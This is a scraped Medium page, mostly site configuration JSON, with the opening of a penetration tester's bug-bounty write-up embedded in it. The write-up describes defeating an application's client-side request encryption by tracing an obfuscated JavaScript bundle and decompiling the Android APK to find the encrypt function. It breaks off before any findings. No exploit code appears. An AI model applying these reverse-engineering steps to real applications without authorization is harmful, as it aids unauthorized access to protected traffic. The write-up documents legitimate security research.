bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250110-154215-d58a2d1ab2","commit":"d58a2d1ab2df37007c05f758ad444c4fe1e39591"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"melotover.medium.com\"})":null,"postResult({\"id\":\"65b708e5ad84\"})":{"__ref":"Post:65b708e5ad84"}},"LinkedAccounts:d906f948337c":{"__typename":"LinkedAccounts","mastodon":null,"id":"d906f948337c"},"User:d906f948337c":{"__typename":"User","id":"d906f948337c","linkedAccounts":{"__ref":"LinkedAccounts:d906f948337c"},"isSuspended":false,"name":"Asem Eleraky","imageId":"1*-oVXJ2PJ5gd_HMA4MY1aPw.jpeg","customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"melotover.medium.com"}},"hasSubdomain":true,"username":"melotover","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":857,"followingCount":8,"collectionFollowingCount":0},"bio":"Penetration Tester, CTF Challenges Developer & Player, Bug Hunter | AKA @Melotover","membership":null,"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:d906f948337c-viewerId:lo_3e69870ddef7"},"twitterScreenName":""},"Paragraph:449009ef02f6_0":{"__typename":"Paragraph","id":"449009ef02f6_0","name":"ca36","type":"H3","href":null,"layout":null,"metadata":null,"text":"Bypassing E2E encryption leads to multiple high vulnerabilities.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_1":{"__typename":"Paragraph","id":"449009ef02f6_1","name":"00aa","type":"P","href":null,"layout":null,"metadata":null,"text":"In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript file that was imported to that application, and how this helped me to better understand the internals of this application and get to find other multiple high vulnerabilities.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_2":{"__typename":"Paragraph","id":"449009ef02f6_2","name":"44c4","type":"H4","href":null,"layout":null,"metadata":null,"text":"Exploration:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_3":{"__typename":"Paragraph","id":"449009ef02f6_3","name":"afc3","type":"P","href":null,"layout":null,"metadata":null,"text":"I started from the login panel, sending requests here and there to explore the application, I found that almost all requests were sent to an API, and their body was formed with some type of encryption as shown below:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*PNqboNXbslmCz01sRrgobw.png":{"__typename":"ImageMetadata","id":"1*PNqboNXbslmCz01sRrgobw.png","originalHeight":1049,"originalWidth":1227,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_4":{"__typename":"Paragraph","id":"449009ef02f6_4","name":"4251","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*PNqboNXbslmCz01sRrgobw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_5":{"__typename":"Paragraph","id":"449009ef02f6_5","name":"86c3","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, I can’t find the real body that was sent to the API, can’t find any parameters, all were encrypted!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_6":{"__typename":"Paragraph","id":"449009ef02f6_6","name":"1e8c","type":"P","href":null,"layout":null,"metadata":null,"text":"That is a type of E2E (End-2-End) encryption, where the communication between the client and the server is encrypted, this is an extra security layer to protect against any type of middle attacks.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_7":{"__typename":"Paragraph","id":"449009ef02f6_7","name":"7f09","type":"P","href":null,"layout":null,"metadata":null,"text":"All requests are initiated from our browser, right? so any kind of encryption or encoding that is performed on the request body would be done on the client side, so javascript files will be our target.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_8":{"__typename":"Paragraph","id":"449009ef02f6_8","name":"0fda","type":"H4","href":null,"layout":null,"metadata":null,"text":"Javascript Files Analysis— First Round:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_9":{"__typename":"Paragraph","id":"449009ef02f6_9","name":"6056","type":"P","href":null,"layout":null,"metadata":null,"text":"There was only one large js file imported to the whole application, it was obfuscated, minimized, and very messy.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*WQ8XNlhBSAWIQkpoRajW2Q.png":{"__typename":"ImageMetadata","id":"1*WQ8XNlhBSAWIQkpoRajW2Q.png","originalHeight":620,"originalWidth":1242,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_10":{"__typename":"Paragraph","id":"449009ef02f6_10","name":"08aa","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*WQ8XNlhBSAWIQkpoRajW2Q.png"},"text":"messy javascript file","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_11":{"__typename":"Paragraph","id":"449009ef02f6_11","name":"836f","type":"P","href":null,"layout":null,"metadata":null,"text":"To find something here is similar to digging for the needle in the haystack, but let’s give it a try!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_12":{"__typename":"Paragraph","id":"449009ef02f6_12","name":"8d75","type":"P","href":null,"layout":null,"metadata":null,"text":"If we look at what we have, we only have the JSON body that has these key\u002Fpairs v, iv, keys, and cipher. All these keys are changeable for every request except the v key, its value is still the same for every request, which is “pef2”.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":80,"end":81,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":83,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":87,"end":91,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":97,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":164,"end":165,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":80,"end":81,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":83,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":87,"end":91,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":97,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":164,"end":166,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":228,"end":232,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":233,"end":234,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*_W95RJqxMI0N_wfMgIdErg.png":{"__typename":"ImageMetadata","id":"1*_W95RJqxMI0N_wfMgIdErg.png","originalHeight":547,"originalWidth":1416,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_13":{"__typename":"Paragraph","id":"449009ef02f6_13","name":"02b8","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*_W95RJqxMI0N_wfMgIdErg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_14":{"__typename":"Paragraph","id":"449009ef02f6_14","name":"fb34","type":"P","href":null,"layout":null,"metadata":null,"text":"As this value is fixed (didn’t change in every request), so for sure it would be defined somewhere in the js file, if I found it, maybe it would lead us to the function that performs this encryption.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Mae5sJSQJweuH6VwlxIkJw.png":{"__typename":"ImageMetadata","id":"1*Mae5sJSQJweuH6VwlxIkJw.png","originalHeight":432,"originalWidth":1518,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_15":{"__typename":"Paragraph","id":"449009ef02f6_15","name":"2f73","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Mae5sJSQJweuH6VwlxIkJw.png"},"text":"searching in javascript to guide us to the function that encrypts the request body","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_16":{"__typename":"Paragraph","id":"449009ef02f6_16","name":"3be1","type":"P","href":null,"layout":null,"metadata":null,"text":"As expected, it was mentioned just once, but I spent some time searching and debugging, following the initiators (it was more than 55 called functions), I figured out how a couple of functions work but it wasn't helpful to my goal (finding where the encryption\u002Fdecryption is done).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":102,"end":113,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_17":{"__typename":"Paragraph","id":"449009ef02f6_17","name":"0025","type":"P","href":null,"layout":null,"metadata":null,"text":"I needed any word or function name to search for in this js file to speed up the reversing process, so I tried to find the old version of this file in the internet archive maybe it wasn’t obfuscated, but no luck.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_18":{"__typename":"Paragraph","id":"449009ef02f6_18","name":"6026","type":"H4","href":null,"layout":null,"metadata":null,"text":"Who else is using the same API?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_19":{"__typename":"Paragraph","id":"449009ef02f6_19","name":"49b1","type":"P","href":null,"layout":null,"metadata":null,"text":"The android application! I thought that I can decompile their android application and get its resources, and try to find if they are using the same encryption\u002Fdecryption implementation or if this file is obfuscated or not! let’s try","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":23,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":94,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*CHuJxG5FrQPiFA3gIgE_zQ.png":{"__typename":"ImageMetadata","id":"1*CHuJxG5FrQPiFA3gIgE_zQ.png","originalHeight":499,"originalWidth":1422,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_20":{"__typename":"Paragraph","id":"449009ef02f6_20","name":"d154","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*CHuJxG5FrQPiFA3gIgE_zQ.png"},"text":"decompiling the APK","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_21":{"__typename":"Paragraph","id":"449009ef02f6_21","name":"2b7c","type":"P","href":null,"layout":null,"metadata":null,"text":"I decompiled the APK with apktool and then started to search for the same word -“pef2”- inside the whole application files.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":26,"end":33,"href":"https:\u002F\u002Fibotpeaches.github.io\u002FApktool\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":81,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*TDd5BQonUaCJLPFjL0ae_A.png":{"__typename":"ImageMetadata","id":"1*TDd5BQonUaCJLPFjL0ae_A.png","originalHeight":490,"originalWidth":1467,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_22":{"__typename":"Paragraph","id":"449009ef02f6_22","name":"ae08","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*TDd5BQonUaCJLPFjL0ae_A.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_23":{"__typename":"Paragraph","id":"449009ef02f6_23","name":"bc2d","type":"P","href":null,"layout":null,"metadata":null,"text":"I found a new js file called “index.android.bundle” containing this word, after opening this file with a js-beautifier tool, and thankfully it was not obfuscated!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":30,"end":50,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":143,"end":161,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*VrR4vHVpJeO9ACPtN3WLqw.png":{"__typename":"ImageMetadata","id":"1*VrR4vHVpJeO9ACPtN3WLqw.png","originalHeight":648,"originalWidth":1184,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_24":{"__typename":"Paragraph","id":"449009ef02f6_24","name":"7381","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*VrR4vHVpJeO9ACPtN3WLqw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_25":{"__typename":"Paragraph","id":"449009ef02f6_25","name":"23d0","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, “pef2” is mentioned in line 106568, and this string is mentioned in a function called “encrypt”.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":17,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":44,"end":50,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":103,"end":111,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_26":{"__typename":"Paragraph","id":"449009ef02f6_26","name":"f638","type":"P","href":null,"layout":null,"metadata":null,"text":"We can use some words mentioned in this function and search for them in the JS file on the web application, just to focus more on our main target which is the web application.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_27":{"__typename":"Paragraph","id":"449009ef02f6_27","name":"42f4","type":"P","href":null,"layout":null,"metadata":null,"text":"I searched for new words like getBytesSync, RSA-OAEP , and of course encrypt .","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":30,"end":42,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":44,"end":52,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":69,"end":76,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":30,"end":55,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":68,"end":78,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_28":{"__typename":"Paragraph","id":"449009ef02f6_28","name":"0f6f","type":"H4","href":null,"layout":null,"metadata":null,"text":"Back to the main 